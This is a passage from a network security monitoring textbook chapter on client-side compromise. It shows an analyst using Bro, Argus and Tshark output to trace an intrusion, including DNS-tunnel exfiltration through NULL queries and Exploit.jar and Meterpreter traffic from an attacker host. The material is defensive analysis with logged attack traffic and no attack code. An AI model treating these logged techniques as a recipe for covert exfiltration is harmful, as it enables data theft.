  id: totrans-694
  prefs: []
  type: TYPE_NORMAL
- en: '#separator \x09'
  id: totrans-695
  prefs: []
  type: TYPE_NORMAL
- en: '#set_separator ,'
  id: totrans-696
  prefs: []
  type: TYPE_NORMAL
- en: '#empty_field (empty)'
  id: totrans-697
  prefs: []
  type: TYPE_NORMAL
- en: '#unset_field -'
  id: totrans-698
  prefs: []
  type: TYPE_NORMAL
- en: '#path capture_loss'
  id: totrans-699
  prefs: []
  type: TYPE_NORMAL
- en: '#open 2013-03-16-15-02-50'
  id: totrans-700
  prefs: []
  type: TYPE_NORMAL
- en: '#fields ts ts_delta peer gaps acks percent_lost'
  id: totrans-701
  prefs: []
  type: TYPE_NORMAL
- en: '#types time interval string count count string'
  id: totrans-702
  prefs: []
  type: TYPE_NORMAL
- en: Client-side Compromise **243**
  id: totrans-703
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-704
  prefs: []
  type: TYPE_NORMAL
- en: 1363446165.986403 900.000429 sovm-eth2-1 0 0 0.000%
  id: totrans-705
  prefs: []
  type: TYPE_NORMAL
- en: 1363446165.992449 900.000470 sovm-eth1-1 0 0 0.000%
  id: totrans-706
  prefs: []
  type: TYPE_NORMAL
- en: 1363447065.986807 900.000404 sovm-eth2-1 17963 19964 u89.977%
  id: totrans-707
  prefs: []
  type: TYPE_NORMAL
- en: 1363447065.992765 900.000316 sovm-eth1-1 0 0 0.000%
  id: totrans-708
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 11-1: Bro* capture_loss .log'
  id: totrans-709
  prefs: []
  type: TYPE_NORMAL
- en: The second-to-last entry at u is shocking. It shows that Bro dropped
  id: totrans-710
  prefs: []
  type: TYPE_NORMAL
- en: 89.977 percent of the traffic seen on the second sniffing sensor interface.
  id: totrans-711
  prefs: []
  type: TYPE_NORMAL
- en: That could be devastating! (Bro may have run out of memory trying to
  id: totrans-712
  prefs: []
  type: TYPE_NORMAL
- en: track a lot of network activity on an underpowered sensor.)
  id: totrans-713
  prefs: []
  type: TYPE_NORMAL
- en: When monitoring a live interface, Bro must make decisions about which
  id: totrans-714
  prefs: []
  type: TYPE_NORMAL
- en: traffic to inspect and which traffic to ignore, simply to try to keep pace with
  id: totrans-715
  prefs: []
  type: TYPE_NORMAL
- en: the live packet stream. When run against a saved trace, Bro has more time
  id: totrans-716
  prefs: []
  type: TYPE_NORMAL
- en: for processing packets, perhaps offering a more thorough analysis.
  id: totrans-717
  prefs: []
  type: TYPE_NORMAL
- en: Remember that one of the tenets of NSM is to use multiple tools for
  id: totrans-718
  prefs: []
  type: TYPE_NORMAL
- en: collection and analysis, so if one tool fails, different sources of data may
  id: totrans-719
  prefs: []
  type: TYPE_NORMAL
- en: still help you determine what happened. Checking the */nsm/sensor_data/*
  id: totrans-720
  prefs: []
  type: TYPE_NORMAL
- en: '*sovm-eth2/dailylogs/2013-03-16* directory on the NSM platform, we find the'
  id: totrans-721
  prefs: []
  type: TYPE_NORMAL
- en: 163MB *snort.log.1363441680* file, which contains the full content data cap-
  id: totrans-722
  prefs: []
  type: TYPE_NORMAL
- en: tured by Netsniff-ng on the SO NSM platform at the time of the incident.
  id: totrans-723
  prefs: []
  type: TYPE_NORMAL
- en: Because we have a copy of the original traffic on disk, we can run tools
  id: totrans-724
  prefs: []
  type: TYPE_NORMAL
- en: like Bro against it. Netsniff-ng was able to save the full trace because it
    was
  id: totrans-725
  prefs: []
  type: TYPE_NORMAL
- en: just logging packets straight to disk; it wasn’t doing any inspection or analy-
  id: totrans-726
  prefs: []
  type: TYPE_NORMAL
- en: sis, as Bro tried to do. To determine what Bro might have missed, we can
  id: totrans-727
  prefs: []
  type: TYPE_NORMAL
- en: rerun Bro against the full content data stored on the sensor. The results are
  id: totrans-728
  prefs: []
  type: TYPE_NORMAL
- en: shown in Listing 11-2\.
  id: totrans-729
  prefs: []
  type: TYPE_NORMAL
- en: $ **bro -r snort.log.1363441680**
  id: totrans-730
  prefs: []
  type: TYPE_NORMAL
- en: $ **ls -al**
  id: totrans-731
  prefs: []
  type: TYPE_NORMAL
- en: total 203008
  id: totrans-732
  prefs: []
  type: TYPE_NORMAL
- en: drwxrwxr-x 3 sovm sovm 4096 Mar 16 15:54 .
  id: totrans-733
  prefs: []
  type: TYPE_NORMAL
- en: drwxr-xr-x 30 sovm sovm 4096 Mar 16 15:53 ..
  id: totrans-734
  prefs: []
  type: TYPE_NORMAL
- en: -rw-rw-r-- 1 sovm sovm 59960 Mar 16 15:54 conn.log
  id: totrans-735
  prefs: []
  type: TYPE_NORMAL
- en: -rw-rw-r-- 1 sovm sovm 44624347 Mar 16 15:54 dns.logu
  id: totrans-736
  prefs: []
  type: TYPE_NORMAL
- en: -rw-rw-r-- 1 sovm sovm 1328 Mar 16 15:54 http.log
  id: totrans-737
  prefs: []
  type: TYPE_NORMAL
- en: -rw-rw-r-- 1 sovm sovm 1446 Mar 16 15:54 notice.log
  id: totrans-738
  prefs: []
  type: TYPE_NORMAL
- en: -rw-rw-r-- 1 sovm sovm 1128 Mar 16 15:54 notice_policy.log
  id: totrans-739
  prefs: []
  type: TYPE_NORMAL
- en: -rw-rw-r-- 1 sovm sovm 251 Mar 16 15:54 packet_filter.log
  id: totrans-740
  prefs: []
  type: TYPE_NORMAL
- en: -rw-r--r-- 1 sovm sovm 163155548 Mar 16 15:53 snort.log.1363441680
  id: totrans-741
  prefs: []
  type: TYPE_NORMAL
- en: -rw-rw-r-- 1 sovm sovm 1066 Mar 16 15:54 ssh.log
  id: totrans-742
  prefs: []
  type: TYPE_NORMAL
- en: drwx------ 3 sovm sovm 4096 Mar 16 15:54 .state
  id: totrans-743
  prefs: []
  type: TYPE_NORMAL
- en: -rw-rw-r-- 1 sovm sovm 1668 Mar 16 15:54 weird.log
  id: totrans-744
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 11-2: Running Bro manual y against full content data*'
  id: totrans-745
  prefs: []
  type: TYPE_NORMAL
- en: The large size of the *dns.log* file at u attracts our attention immediately.
  id: totrans-746
  prefs: []
  type: TYPE_NORMAL
- en: How is there a 44MB DNS log for a 163MB packet trace?
  id: totrans-747
  prefs: []
  type: TYPE_NORMAL
- en: '**244** Chapter 11'
  id: totrans-748
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-749
  prefs: []
  type: TYPE_NORMAL
- en: '**analyzing the bro dns.log file**'
  id: totrans-750
  prefs: []
  type: TYPE_NORMAL
- en: We decide to browse the new *dns.log* file manually to see what it reveals.
  id: totrans-751
  prefs: []
  type: TYPE_NORMAL
- en: '**N o T e :** *In early 2013, ELSA author Martin Holste added an* import.pl
    *script* (https://'
  id: totrans-752
  prefs: []
  type: TYPE_NORMAL
- en: code.google.com/p/enterprise-log-search-and-archive/source/browse/
  id: totrans-753
  prefs: []
  type: TYPE_NORMAL
- en: trunk/elsa/node/import.pl/) *to ELSA to enable manual log additions. For this*
  id: totrans-754
  prefs: []
  type: TYPE_NORMAL
- en: '*example, however, we will combine the earlier ELSA query method with manual
    log*'
  id: totrans-755
  prefs: []
  type: TYPE_NORMAL
- en: '*review, to demonstrate how analysts can use both techniques.*'
  id: totrans-756
  prefs: []
  type: TYPE_NORMAL
- en: We see many normal entries, and then a few that look odd. Listing 11-3
  id: totrans-757
  prefs: []
  type: TYPE_NORMAL
- en: shows a few sample DNS log entries.
  id: totrans-758
  prefs: []
  type: TYPE_NORMAL
- en: 1363444304.701350 fOBMXgho3v5 10.0.0.99 40912 198.51.100.3 53 udp 10453 daisy.ubuntu.comu
    1 C_INTERNET 1 Ay 0 NOERROR F
  id: totrans-759
  prefs: []
  type: TYPE_NORMAL
- en: F T T 0 91.189.95.54,91.189.95.55{ 5.000000,5.000000
  id: totrans-760
  prefs: []
  type: TYPE_NORMAL
- en: 1363444390.148462 Vr7iTah4er6 10.0.0.99| 58566 203.0.113.8} 53 udp 470 labhl2pekjmnzoaoteostk4ms4xfhzma.practicalnsm.comv
    1 C_INTERNET 10
  id: totrans-761
  prefs: []
  type: TYPE_NORMAL
- en: NULLz - - F F T
  id: totrans-762
  prefs: []
  type: TYPE_NORMAL
- en: F 0 - -
  id: totrans-763
  prefs: []
  type: TYPE_NORMAL
- en: 1363444390.147170 Vr7iTah4er6 10.0.0.99| 58566 203.0.113.8} 53 udp 58279 vaaaakat2v2.practicalnsm.comw
    1 C_INTERNET 10 NULLz - -
  id: totrans-764
  prefs: []
  type: TYPE_NORMAL
- en: F F T F 0 -
  id: totrans-765
  prefs: []
  type: TYPE_NORMAL
- en: '-'
  id: totrans-766
  prefs: []
  type: TYPE_NORMAL
- en: 1363444390.092180 Vr7iTah4er6 10.0.0.99| 58566 203.0.113.8} 53 udp 50552 yrb5fo.practicalnsm.comx
    1 C_INTERNET 10 NULLz - - F
  id: totrans-767
  prefs: []
  type: TYPE_NORMAL
- en: F T F 0 - -
  id: totrans-768
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 11-3: Normal and suspicious entries in the Bro* dns .log *file*'
  id: totrans-769
  prefs: []
  type: TYPE_NORMAL
- en: The first record for *daisy.ubuntu.com* u looks like a regular DNS query;
  id: totrans-770
  prefs: []
  type: TYPE_NORMAL
- en: someone wants to know the IP address for this site. But the second two records
  id: totrans-771
  prefs: []
  type: TYPE_NORMAL
- en: look odd. Why is someone querying for *labhl2pekjmnzoaoteostk4ms4xfhzma*
  id: totrans-772
  prefs: []
  type: TYPE_NORMAL
- en: '*.practicalnsm.com* v, *vaaaakat2v2.practicalnsm.com* w, and *yrb5fo.practicalnsm*'
  id: totrans-773
  prefs: []
  type: TYPE_NORMAL
- en: '*.com* x? Also, unlike the first query for an A record y, these are NULL que-'
  id: totrans-774
  prefs: []
  type: TYPE_NORMAL
- en: ries z, which serve no practical purpose. A query for an A record returns
  id: totrans-775
  prefs: []
  type: TYPE_NORMAL
- en: the IP address associated with a domain name. Bro logs the response to the
  id: totrans-776
  prefs: []
  type: TYPE_NORMAL
- en: A record query in the single DNS log {.
  id: totrans-777
  prefs: []
  type: TYPE_NORMAL
- en: 'Also note the source and destination IP addresses for these queries:'
  id: totrans-778
  prefs: []
  type: TYPE_NORMAL
- en: 10.0.0.99 | and 203.0.113.8 }. The source IP address 10.0.0.99 was the sys-
  id: totrans-779
  prefs: []
  type: TYPE_NORMAL
- en: tem to which 172.16.0.37 connected three times via SSH. The destination IP
  id: totrans-780
  prefs: []
  type: TYPE_NORMAL
- en: address shares the same net block as 203.0.113.15, the computer hosting a
  id: totrans-781
  prefs: []
  type: TYPE_NORMAL
- en: malicious Java payload. Something odd is happening here. Then we notice
  id: totrans-782
  prefs: []
  type: TYPE_NORMAL
- en: other weird entries that also involve 10.0.0.99 and 203.0.113.8, as shown in
  id: totrans-783
  prefs: []
  type: TYPE_NORMAL
- en: Listing 11-4\. These are NULL DNS records as well u.
  id: totrans-784
  prefs: []
  type: TYPE_NORMAL
- en: Client-side Compromise **245**
  id: totrans-785
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-786
  prefs: []
  type: TYPE_NORMAL
- en: 1363445036.498672 FVaYW5ltbNh 10.0.0.99 34482 203.0.113.8 53 udp 49394 0euase6eq\xc5v\xc1\xbfp2\xc5h\xdd\xd0kmv\xedt\xc2\xc7\xf8\xea2p\xdc\xe0\xcd\xef\xfd\
    xc5t\xed8t\xc4yj\xd1\xdf9qn\xf8\xcf0\xd8\xd480\xe7\xc5\xda\xf97\xe5k.\xebb6\xd3gj\xc76\xdb\xe9\
    xdbn\xce\xf1lv\xeb\xbdo\xdayn5gko\xc3tny9\xbf\xe5\xee\xce\xd3\xfb\xee\xc2bd\xd9zj\xbe\xe2z\
    xf37\xbe\xcf\xbeh\xfd\xea\xfbe.\xecch\xd4k\xc2cgjqq\xf2\xe5\xd1mj\xcck6mg\xf5z\xc5\xe7sc\xeb\
    xea\xfbsc\xe4\xeb\xf9\xe7xq\xd57\xd9t\xe3\xe3\xef\xc0m\xd7fh\xeav\xcc8dgs.r\xfd\xe9\xf8\xca\
    xd3\xe9\xc4\xd4u\xect8z\xcc\xf2w\xecyy\xc3\xf7n5bq\xf9\xe1v\xc1e\xcdo\xc8z\xf53\xcecgpwy\xd7\
    xfdr\xe5\xfae9iy\xe9\xebz7.practicalnsm.com 1
  id: totrans-787
  prefs: []
  type: TYPE_NORMAL
- en: C_INTERNET 10 NULLu - - F F T F 0
  id: totrans-788
  prefs: []
  type: TYPE_NORMAL
- en: '- -'
  id: totrans-789
  prefs: []
  type: TYPE_NORMAL
- en: 1363444959.826628 FVaYW5ltbNh 10.0.0.99 34482 203.0.113.8 53 udp 53252 0iiafy\xf7\xdf\xdbw\xfa\xe3\xe1w\xe7u5\xd5auz\xbf\xe3\xd6\xe6\xd0\xf4u\xc0a\xe4\
    xc3l\xdf\xe6\xe1\xf6\xe1\xe1\xbf\xf62c\xd6\xe6d\xe8\xcf\xe2m\xc4\xe3\xe8\xeeru\xe68\xcd\
    xc8\xf4j.\xea\xf9ujb\xdau\xc0\xda\xf3\xef\xeb\xc5\xf9\xc4p\xbe\xee\xf6\xc1awd\xfc\xf2\xc5\
    xd0\xfd\xf1\xc0f\xc5r\xe0\xc9\xecm\xdd\xd2\xe2l\xf0\xd8\xfc\xd8ct5\xc6\xfdt\xcce\xec\xf7z\
    xea.z\xe5m\xfbr\xe9\xbe\xd2\xe7\xfd\xe3\xc6cu\xc2wtz\xeb\xe1uqk\xbf\xf2\xcb4\xe6v1w\xcei\xd8\
    xca\xc8hmsg4qjzhkd\xe0u\xe4\xfa\xc7nitlk.\xbc\xeb\xdec\xe1\xc8l31yiz\xfd\xd1\xf8\xfdro\xd0\
    xef3p\xccoql\xd9\xdb\xc5\xedt\xc2\xc1\xd5\xf2m\xfcq\xebm\xc2\xc8f\xf9x\xf8xikc\xc3wu\xdfcc.
  id: totrans-790
  prefs: []
  type: TYPE_NORMAL
- en: practicalnsm.com 1 C_INTERNET 10 NULLu - - F F T
  id: totrans-791
  prefs: []
  type: TYPE_NORMAL
- en: F 0 - -
  id: totrans-792
  prefs: []
  type: TYPE_NORMAL
- en: 1363445003.696798 FVaYW5ltbNh 10.0.0.99 34482 203.0.113.8 53 udp 45003 0akazvdidx3\xf1bv\xf078w\xe20\xfd\xd0i\xc1\xe7d\xe2\xc5\xcd\xe3\xda7\xe0\xf9\xbf9\
    xfdk\xefrxcn\xd5\xebue\xc6\xed\xbc\xc5b\xe2\xcc\xda\xd0\xc3\xe2\xbdij8.\xdf\xf3\xfa\xefy\xfd\
    xc8yhm\xbe\xf77l\xc8\xdc\xe3\xe0\xca\xdeo\xc0\xf3\xcbam\xd1\xd2\xfdt\xd1i\xd7r\xea\xcbc3\xdc\
    xee\xe5\xe04o\xd9\xce\xec8n\xf99w\xd8\xfcjnw.\xf2j\xe4\xf5\xf6\xeb\xc60\xf3hv\xf9\xc38s\xef\
    xd5b\xe4\xc6\xc9\xc9g\xd38\xfbhy\xf5\xccxw\xc7\xd0a2ypsz\xca\xe3\xbd\xc8\xbd\xc6cy\xd2\xce\
    xbf\xe0b\xd8\xc4\xc6i.cb1\xf4fqp\xce\xd4\xebb\xe9v\xfdk\xed\xc3\xce\xcf\xe5j\xf9u\xf4uyn\
    xed\xe3o\xf6l\xd7zyrp\xf2\xfd5swrz\xe8\xe6\xd5\xe2\xd3iv\xf2m\xd2\xe9\xdb.practicalnsm.com
    1 C_INTERNET 10 NULLu - - F F T F 0
  id: totrans-793
  prefs: []
  type: TYPE_NORMAL
- en: '- -'
  id: totrans-794
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 11-4: Malicious entries in the Bro* dns .log *file*'
  id: totrans-795
  prefs: []
  type: TYPE_NORMAL
- en: It looks as if someone is transporting data within hostnames in the
  id: totrans-796
  prefs: []
  type: TYPE_NORMAL
- en: '*practicalnsm.com* domain. This appears to be a form of covert channel—an'
  id: totrans-797
  prefs: []
  type: TYPE_NORMAL
- en: intruder is sending content via DNS records.
  id: totrans-798
  prefs: []
  type: TYPE_NORMAL
- en: The technique we’re observing is popular when defenders keep tight
  id: totrans-799
  prefs: []
  type: TYPE_NORMAL
- en: access controls on outbound traffic. If an attacker can query name servers,
  id: totrans-800
  prefs: []
  type: TYPE_NORMAL
- en: he can send data packaged as part of the hostnames he queries via DNS.
  id: totrans-801
  prefs: []
  type: TYPE_NORMAL
- en: (This is a low-bandwidth attack method because a limited number of bytes
  id: totrans-802
  prefs: []
  type: TYPE_NORMAL
- en: can be carried in a hostname. In fact, more than 65,000 DNS records in
  id: totrans-803
  prefs: []
  type: TYPE_NORMAL
- en: this particular Bro *dns.log* file are associated with this sort of activity.)
  id: totrans-804
  prefs: []
  type: TYPE_NORMAL
- en: '**checking destination Ports**'
  id: totrans-805
  prefs: []
  type: TYPE_NORMAL
- en: So far, we’ve recognized that four IP addresses are involved in this particular
  id: totrans-806
  prefs: []
  type: TYPE_NORMAL
- en: 'intrusion. Two belong to Vivian’s Pets: 172.16.0.37 (in the wireless network),'
  id: totrans-807
  prefs: []
  type: TYPE_NORMAL
- en: and 10.0.0.99 (in the internal network). Two belong to the intruder and sit
  id: totrans-808
  prefs: []
  type: TYPE_NORMAL
- en: 'on the Internet: 203.0.113.15 and 203.0.113.8\. Figure 11-11 shows the posi-'
  id: totrans-809
  prefs: []
  type: TYPE_NORMAL
- en: tions of these IP addresses on the network.
  id: totrans-810
  prefs: []
  type: TYPE_NORMAL
- en: '**246** Chapter 11'
  id: totrans-811
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-812
  prefs: []
  type: TYPE_NORMAL
- en: '![Image 140](index-281_1.png)'
  id: totrans-813
  prefs: []
  type: TYPE_IMG
- en: Intruder 1
  id: totrans-814
  prefs: []
  type: TYPE_NORMAL
- en: Internet
  id: totrans-815
  prefs: []
  type: TYPE_NORMAL
- en: 203.0.113.15
  id: totrans-816
  prefs: []
  type: TYPE_NORMAL
- en: Intruder 2
  id: totrans-817
  prefs: []
  type: TYPE_NORMAL
- en: 203.0.113.8
  id: totrans-818
  prefs: []
  type: TYPE_NORMAL
- en: Tap
  id: totrans-819
  prefs: []
  type: TYPE_NORMAL
- en: Wireless
  id: totrans-820
  prefs: []
  type: TYPE_NORMAL
- en: Network
  id: totrans-821
  prefs: []
  type: TYPE_NORMAL
- en: Tap
  id: totrans-822
  prefs: []
  type: TYPE_NORMAL
- en: NSM
  id: totrans-823
  prefs: []
  type: TYPE_NORMAL
- en: Laptop
  id: totrans-824
  prefs: []
  type: TYPE_NORMAL
- en: Internal
  id: totrans-825
  prefs: []
  type: TYPE_NORMAL
- en: 172.16.0.37
  id: totrans-826
  prefs: []
  type: TYPE_NORMAL
- en: Network
  id: totrans-827
  prefs: []
  type: TYPE_NORMAL
- en: Desktop
  id: totrans-828
  prefs: []
  type: TYPE_NORMAL
- en: 10.0.0.99
  id: totrans-829
  prefs: []
  type: TYPE_NORMAL
- en: '*Figure 11-11: Participants in the intrusion*'
  id: totrans-830
  prefs: []
  type: TYPE_NORMAL
- en: We decide to take another look at traffic involving 203.0.113.115, this
  id: totrans-831
  prefs: []
  type: TYPE_NORMAL
- en: time by querying ELSA for records and group by dstport (destination port).
  id: totrans-832
  prefs: []
  type: TYPE_NORMAL
- en: The results are shown in Figure 11-12\.
  id: totrans-833
  prefs: []
  type: TYPE_NORMAL
- en: '*Figure 11-12: ELSA displays a summary*'
  id: totrans-834
  prefs: []
  type: TYPE_NORMAL
- en: '*of dstport entries for 203.0.113.15\.*'
  id: totrans-835
  prefs: []
  type: TYPE_NORMAL
- en: Client-side Compromise **247**
  id: totrans-836
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-837
  prefs: []
  type: TYPE_NORMAL
- en: '![Image 141](index-282_1.png)'
  id: totrans-838
  prefs: []
  type: TYPE_IMG
- en: '![Image 142](index-282_2.png)'
  id: totrans-839
  prefs: []
  type: TYPE_IMG
- en: Records with 54056 as the destination port are associated with the
  id: totrans-840
  prefs: []
  type: TYPE_NORMAL
- en: Metasploit Meterpreter activity noted earlier. There is only one type of mes-
  id: totrans-841
  prefs: []
  type: TYPE_NORMAL
- en: sage for this activity; they are all Snort alerts, as shown in Figure 11-13\.
  id: totrans-842
  prefs: []
  type: TYPE_NORMAL
- en: '*Figure 11-13: ELSA displays a summary of Snort signatures for*'
  id: totrans-843
  prefs: []
  type: TYPE_NORMAL
- en: '*203.0.113.15 and dstport 54056\.*'
  id: totrans-844
  prefs: []
  type: TYPE_NORMAL
- en: Turning to destination port 4444, we use a similar process with similar
  id: totrans-845
  prefs: []
  type: TYPE_NORMAL
- en: results. Figure 11-14 shows what ELSA returns when we examine records
  id: totrans-846
  prefs: []
  type: TYPE_NORMAL
- en: where port 4444 is the destination port and 203.0.113.15 is an IP address.
  id: totrans-847
  prefs: []
  type: TYPE_NORMAL
- en: '*Figure 11-14: ELSA displays a summary of Snort signatures for*'
  id: totrans-848
  prefs: []
  type: TYPE_NORMAL
- en: '*203.0.113.15 and dstport 4444\.*'
  id: totrans-849
  prefs: []
  type: TYPE_NORMAL
- en: It’s important to realize that these two destination ports are actually
  id: totrans-850
  prefs: []
  type: TYPE_NORMAL
- en: artifacts of packets being exchanged between the computers at 203.0.113.15
  id: totrans-851
  prefs: []
  type: TYPE_NORMAL
- en: and 172.16.0.37\. It may be difficult to recognize this because ELSA is sum-
  id: totrans-852
  prefs: []
  type: TYPE_NORMAL
- en: marizing information captured in Snort alerts and other formats. However,
  id: totrans-853
  prefs: []
  type: TYPE_NORMAL
- en: a quick check of the Argus session data makes it easy to understand this
  id: totrans-854
  prefs: []
  type: TYPE_NORMAL
- en: important connection, as shown in Listing 11-5\.
  id: totrans-855
  prefs: []
  type: TYPE_NORMAL
- en: $ **racluster -n -r /nsm/sensor_data/sovm-eth1/argus/2013-03-16.log - host 203.0.113.15**
  id: totrans-856
  prefs: []
  type: TYPE_NORMAL
- en: StartTime Flgs Proto SrcAddr Sport Dir DstAddr Dport
  id: totrans-857
  prefs: []
  type: TYPE_NORMAL
- en: TotPkts TotBytes State
  id: totrans-858
  prefs: []
  type: TYPE_NORMAL
- en: 14:16:48.724146 e tcp 172.16.0.37.60320 -> 203.0.113.15.8080u 19 3360 FIN
  id: totrans-859
  prefs: []
  type: TYPE_NORMAL
- en: 14:16:52.544555 e tcp 172.16.0.37.60321 -> 203.0.113.15.8080v 13 1790 FIN
  id: totrans-860
  prefs: []
  type: TYPE_NORMAL
- en: 14:16:52.735852 e tcp 172.16.0.37.60322 -> 203.0.113.15.8080w 27 16164 FIN
  id: totrans-861
  prefs: []
  type: TYPE_NORMAL
- en: 14:16:53.371660 e tcp 172.16.0.37.54056 -> 203.0.113.15.4444x 2802 834486 FIN
  id: totrans-862
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 11-5: Argus records for sessions involving 203.0.113.15*'
  id: totrans-863
  prefs: []
  type: TYPE_NORMAL
- en: '**248** Chapter 11'
  id: totrans-864
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-865
  prefs: []
  type: TYPE_NORMAL
- en: This record shows that 172.16.0.37 connected to 203.0.113.15 four times, as
    shown in the four sessions. The first three sessions connected to port 8080
  id: totrans-866
  prefs: []
  type: TYPE_NORMAL
- en: TCP at u, v, and w. The last session connected to port 4444 TCP x.
  id: totrans-867
  prefs: []
  type: TYPE_NORMAL
- en: We can examine these conversations via the full content data as well,
  id: totrans-868
  prefs: []
  type: TYPE_NORMAL
- en: and use Tshark to pay attention to the HTTP traffic to port 8080 TCP.
  id: totrans-869
  prefs: []
  type: TYPE_NORMAL
- en: Listing 11-6 shows that activity.
  id: totrans-870
  prefs: []
  type: TYPE_NORMAL
- en: $ **tshark -t ad -n -r /nsm/sensor_data/sovm-eth1/dailylogs/2013-03-16/snort**
  id: totrans-871
  prefs: []
  type: TYPE_NORMAL
- en: '**.log.1363441666 -R ''tcp.port==8080 and http''**'
  id: totrans-872
  prefs: []
  type: TYPE_NORMAL
- en: 2910 2013-03-16 14:16:48.727696 172.16.0.37 -> 203.0.113.15 HTTP 373
  id: totrans-873
  prefs: []
  type: TYPE_NORMAL
- en: GET /healthcarenews HTTP/1.1
  id: totrans-874
  prefs: []
  type: TYPE_NORMAL
- en: 2912 2013-03-16 14:16:48.729359 203.0.113.15 -> 172.16.0.37 HTTP 200
  id: totrans-875
  prefs: []
  type: TYPE_NORMAL
- en: HTTP/1.1 302 Moved
  id: totrans-876
  prefs: []
  type: TYPE_NORMAL
- en: 2914 2013-03-16 14:16:48.746910 172.16.0.37 -> 203.0.113.15 HTTP 374
  id: totrans-877
  prefs: []
  type: TYPE_NORMAL
- en: GET /healthcarenews/ HTTP/1.1
  id: totrans-878
  prefs: []
  type: TYPE_NORMAL
- en: 2915 2013-03-16 14:16:48.752649 203.0.113.15 -> 172.16.0.37 HTTP 291
  id: totrans-879
  prefs: []
  type: TYPE_NORMAL
- en: HTTP/1.1 200 OK (text/html)
  id: totrans-880
  prefs: []
  type: TYPE_NORMAL
- en: 2917 2013-03-16 14:16:48.897487 172.16.0.37 -> 203.0.113.15 HTTP 340
  id: totrans-881
  prefs: []
  type: TYPE_NORMAL
- en: GET /favicon.ico HTTP/1.1
  id: totrans-882
  prefs: []
  type: TYPE_NORMAL
- en: 2918 2013-03-16 14:16:48.899164 203.0.113.15 -> 172.16.0.37 HTTP 335
  id: totrans-883
  prefs: []
  type: TYPE_NORMAL
- en: HTTP/1.1 404 File not found (text/html)
  id: totrans-884
  prefs: []
  type: TYPE_NORMAL
- en: 2920 2013-03-16 14:16:48.905587 172.16.0.37 -> 203.0.113.15 HTTP 370
  id: totrans-885
  prefs: []
  type: TYPE_NORMAL
- en: GET /favicon.ico HTTP/1.1
  id: totrans-886
  prefs: []
  type: TYPE_NORMAL
- en: 2921 2013-03-16 14:16:48.908271 203.0.113.15 -> 172.16.0.37 HTTP 335
  id: totrans-887
  prefs: []
  type: TYPE_NORMAL
- en: HTTP/1.1 404 File not found (text/html)
  id: totrans-888
  prefs: []
  type: TYPE_NORMAL
- en: 2926 2013-03-16 14:16:52.560069 172.16.0.37 -> 203.0.113.15 HTTP 415
  id: totrans-889
  prefs: []
  type: TYPE_NORMAL
- en: GET /healthcarenews/Exploit.jar.pack.gzu HTTP/1.1
  id: totrans-890
  prefs: []
  type: TYPE_NORMAL
- en: 2928 2013-03-16 14:16:52.719387 203.0.113.15 -> 172.16.0.37 HTTP 200
  id: totrans-891
  prefs: []
  type: TYPE_NORMAL
- en: HTTP/1.1 302 Moved
  id: totrans-892
  prefs: []
  type: TYPE_NORMAL
- en: 2930 2013-03-16 14:16:52.722747 172.16.0.37 -> 203.0.113.15 HTTP 274
  id: totrans-893
  prefs: []
  type: TYPE_NORMAL
- en: GET /healthcarenews/ HTTP/1.1
  id: totrans-894
  prefs: []
  type: TYPE_NORMAL
- en: 2932 2013-03-16 14:16:52.725372 203.0.113.15 -> 172.16.0.37 HTTP 291
  id: totrans-895
  prefs: []
  type: TYPE_NORMAL
- en: HTTP/1.1 200 OKx (text/html)
  id: totrans-896
  prefs: []
  type: TYPE_NORMAL
- en: 2939 2013-03-16 14:16:52.738151 172.16.0.37 -> 203.0.113.15 HTTP 364
  id: totrans-897
  prefs: []
  type: TYPE_NORMAL
- en: GET /healthcarenews/Exploit.jarv HTTP/1.1
  id: totrans-898
  prefs: []
  type: TYPE_NORMAL
- en: 2945 2013-03-16 14:16:53.022853 203.0.113.15 -> 172.16.0.37 HTTP 1138
  id: totrans-899
  prefs: []
  type: TYPE_NORMAL
- en: HTTP/1.1 200 OKy (application/octet-stream)
  id: totrans-900
  prefs: []
  type: TYPE_NORMAL
- en: 2951 2013-03-16 14:16:53.037218 172.16.0.37 -> 203.0.113.15 HTTP 406
  id: totrans-901
  prefs: []
  type: TYPE_NORMAL
- en: GET /healthcarenews/Exploit.jarw HTTP/1.1
  id: totrans-902
  prefs: []
  type: TYPE_NORMAL
- en: 2957 2013-03-16 14:16:53.056665 203.0.113.15 -> 172.16.0.37 HTTP 1138
  id: totrans-903
  prefs: []
  type: TYPE_NORMAL
- en: HTTP/1.1 200 OKz (application/octet-stream)
  id: totrans-904
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 11-6: HTTP traffic from 172.16.0.37 to 203.0.113.15*'
  id: totrans-905
  prefs: []
  type: TYPE_NORMAL
- en: Listing 11-6 contains several troublesome entries. Requests for *Exploit*
  id: totrans-906
  prefs: []
  type: TYPE_NORMAL
- en: '*.jar .pack.gz* at u and *Exploit.jar* v w indicate the intruder’s code on
    the victim system is trying to retrieve additional software from the attacking
    system. The'
  id: totrans-907
  prefs: []
  type: TYPE_NORMAL
- en: initial code running on the victim is a beachhead, and now it’s calling back
  id: totrans-908
  prefs: []
  type: TYPE_NORMAL
- en: home for reinforcements. Unfortunately for the victim, those packages are
  id: totrans-909
  prefs: []
  type: TYPE_NORMAL
- en: available and served upon order, as shown by the 200 OK responses x y z.
  id: totrans-910
  prefs: []
  type: TYPE_NORMAL
- en: This is another way to view activity that started the intrusion. However,
  id: totrans-911
  prefs: []
  type: TYPE_NORMAL
- en: we still need to know what happened after the attack succeeded.
  id: totrans-912
  prefs: []
  type: TYPE_NORMAL
- en: Client-side Compromise **249**
  id: totrans-913
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-914
  prefs: []
  type: TYPE_NORMAL
- en: '![Image 143](index-284_1.png)'
